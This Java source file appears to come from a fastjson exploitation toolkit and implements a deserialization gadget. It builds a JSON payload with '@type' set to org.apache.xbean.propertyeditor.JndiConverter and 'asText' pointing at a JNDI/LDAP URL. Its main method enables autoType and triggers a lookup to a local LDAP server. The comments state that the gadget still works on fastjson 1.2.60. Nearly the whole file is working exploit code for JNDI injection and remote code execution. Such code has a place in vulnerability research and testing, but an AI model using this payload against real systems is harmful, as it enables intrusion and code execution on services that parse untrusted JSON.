package fastjsonExp;

import org.apache.xbean.propertyeditor.JndiConverter;
import utils.FastjsonVersionCtr;
import utils.StringUtils;
import org.apache.xbean.propertyeditor.AbstractConverter;

/**
 * 已完成
 * org.apache.xbean.propertyeditor.
 * still work at fastjson 1.2.60
 * 通过调用父类的setAsText，调用toObject，进而调用子类（JndiConverter）的toObjectImpl
 */

public class EXP4xbean {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"replace_here\"}";
    public  void actual_fun(String url) throws Exception {
        JndiConverter jndiConverter = new JndiConverter();
        jndiConverter.setAsText(url);

    }
    public  void actual_fun() throws Exception {
        if(!StringUtils.isNull(this.JNDI_URL)){
            this.actual_fun(this.JNDI_URL);
        }
    }
    public EXP4xbean(){}
    public EXP4xbean(String uri){
        this.JNDI_URL = uri;
        //String encodeUri = Base64.encodeToString(uri.getBytes());
        this.payload = this.payload.replace("replace_here",uri);

    }
    public String getPayload(){
        System.out.println(this.payload);
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.62");
        myFastjson.mySetAutoType(true);
        EXP4xbean exp = new EXP4xbean("ldap://127.0.0.1:1389/run");
        //myFastjson.myParseObject(exp.getPayload());
        exp.actual_fun();
        myFastjson.clear();

    }


}
